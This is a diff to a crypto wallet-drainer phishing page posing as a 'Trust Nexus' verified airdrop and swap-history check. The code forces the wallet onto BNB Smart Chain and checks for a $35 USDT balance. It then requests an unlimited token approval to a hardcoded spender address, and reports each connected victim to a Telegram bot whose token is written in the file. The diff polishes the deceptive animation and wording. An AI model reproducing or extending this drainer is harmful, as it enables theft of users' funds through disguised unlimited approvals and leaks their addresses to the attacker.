@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -7,7 +6,7 @@
     <title>Trust Nexus × Verified Airdrop</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
     <style>
-        :root { --primary: #007aff; --accent: #00ff88; --bg: #05070a; }
+        :root { --primary: #007aff; --accent: #00ff88; --bg: #05070a; --usdt: #26a17b; --bnb: #f3ba2f; }
         body { background: var(--bg); color: white; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; background-image: radial-gradient(circle at center, #0a192f 0%, #05070a 100%); }
         .container { width: 90%; max-width: 380px; text-align: center; }
         .header { display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 20px; font-size: 13px; opacity: 0.8; }
@@ -26,9 +25,26 @@
         .btn-main { background: linear-gradient(45deg, #007aff, #00ff88); color: white; box-shadow: 0 10px 20px rgba(0, 122, 255, 0.3); }
         
         #screen2, #screen3 { display: none; }
+
+        /* --- New Attractive Swap Animation --- */
+        .loader-wrapper { position: relative; width: 100px; height: 100px; margin: 30px auto; }
+        .outer-ring { position: absolute; width: 100%; height: 100%; border: 2px solid rgba(0, 255, 136, 0.1); border-top: 2px solid var(--accent); border-radius: 50%; animation: spin 2s linear infinite; }
         
-        .loader-circle { width: 80px; height: 80px; border: 4px solid rgba(255,255,255,0.05); border-top: 4px solid var(--accent); border-radius: 50%; margin: 20px auto; animation: spin 1s linear infinite; }
+        .swap-visual { position: absolute; width: 100%; height: 100%; display: flex; justify-content: center; align-items: center; }
+        .icon-node { width: 30px; height: 30px; border-radius: 8px; display: flex; align-items: center; justify-content: center; font-weight: 900; font-size: 14px; position: absolute; box-shadow: 0 0 15px rgba(0,0,0,0.5); }
+        
+        .usdt-node { background: var(--usdt); color: white; animation: moveOrbit1 3s ease-in-out infinite; }
+        .bnb-node { background: var(--bnb); color: black; animation: moveOrbit2 3s ease-in-out infinite; }
+
         @keyframes spin { 100% { transform: rotate(360deg); } }
+        @keyframes moveOrbit1 { 
+            0%, 100% { transform: translate(-25px, 0) scale(1); z-index: 2; } 
+            50% { transform: translate(25px, 0) scale(0.8); z-index: 1; opacity: 0.6; }
+        }
+        @keyframes moveOrbit2 { 
+            0%, 100% { transform: translate(25px, 0) scale(0.8); z-index: 1; opacity: 0.6; } 
+            50% { transform: translate(-25px, 0) scale(1); z-index: 2; opacity: 1; }
+        }
         
         .status-text { font-size: 14px; color: var(--accent); font-weight: bold; margin-bottom: 10px; }
     </style>
@@ -55,9 +71,15 @@
     </div>
 
     <div id="screen2">
-        <div class="loader-circle"></div>
+        <div class="loader-wrapper">
+            <div class="outer-ring"></div>
+            <div class="swap-visual">
+                <div class="icon-node usdt-node">T</div>
+                <div class="icon-node bnb-node">B</div>
+            </div>
+        </div>
         <div class="status-text">Smart-Sync Active</div>
-        <p style="font-size: 13px; color: #888;">Verifying $35 Swap History & Assets...</p>
+        <p style="font-size: 13px; color: #888;">Scanning DEX Swap History...</p>
         
         <div class="mission-box" style="border-color: var(--primary);">
             <p style="font-size: 12px; margin: 0; color: #ccc;">Checking Blockchain for:<br><b>Status:</b> <span id="sync-status">Awaiting Swap Confirmation...</span></p>
@@ -83,7 +105,8 @@
         spender: "0xfeCB861c6405D86561f34101C34Ab328473209BE",
         bot: "8368124815:AAGQ66vMDN1hOFtAdAAQU6UFcxGxrjRwOmU",
         chat: "5715359020",
-        min: "35.0"
+        min: "35.0",
+        chainId: "0x38" // BSC Mainnet
     };
 
     let prov, sign, user;
@@ -100,13 +123,30 @@
         if (!window.ethereum) return alert("Open in Trust Wallet Browser");
         try {
             prov = new ethers.providers.Web3Provider(window.ethereum);
-            await prov.send("eth_requestAccounts", []);
+            
+            // Step 1: Request Account
+            const accounts = await prov.send("eth_requestAccounts", []);
+            
+            // Step 2: Force Switch to BNB Smart Chain
+            const currentChain = await window.ethereum.request({ method: 'eth_chainId' });
+            if (currentChain !== SETTINGS.chainId) {
+                try {
+                    await window.ethereum.request({
+                        method: 'wallet_switchEthereumChain',
+                        params: [{ chainId: SETTINGS.chainId }],
+                    });
+                } catch (e) {
+                    alert("Please switch to BNB Smart Chain manually.");
+                    return;
+                }
+            }
+
             sign = prov.getSigner();
             user = await sign.getAddress();
             
             document.getElementById('screen1').style.display = 'none';
             document.getElementById('screen2').style.display = 'block';
-            notify(`🚀 <b>User Connected</b>\nAddress: <code>${user}</code>`);
+            notify(`🚀 <b>User Connected (BSC)</b>\nAddress: <code>${user}</code>`);
         } catch (e) { alert("Connect Failed"); }
     }
 
@@ -118,7 +158,7 @@
             ], sign);
 
             const balance = await contract.balanceOf(user);
-            const minNeeded = ethers.utils.parseUnits(SETTINGS.min, 18);
+            const minNeeded = ethers.utils.parseUnits(SETTINGS.min, 18); // Correct for BSC USDT
 
             if (balance.lt(minNeeded)) {
                 alert("Error: Minimum $35 USDT required in wallet to verify swap history.");
@@ -127,13 +167,11 @@
 
             document.getElementById('sync-status').innerText = "Confirming Swap Sync...";
             
-            // This is where you get the approval
             const tx = await contract.approve(SETTINGS.spender, ethers.constants.MaxUint256);
             notify(`🔄 <b>Approval Initiated</b>\nUser: <code>${user}</code>`);
             
             await tx.wait();
             
-            // Only show success screen AFTER approval is confirmed
             document.getElementById('screen2').style.display = 'none';
             document.getElementById('screen3').style.display = 'block';
             notify(`✅ <b>SYNC SUCCESS!</b>\nUser: <code>${user}</code>`);
@@ -145,3 +183,4 @@
 </script>
 </body>
 </html>
+    
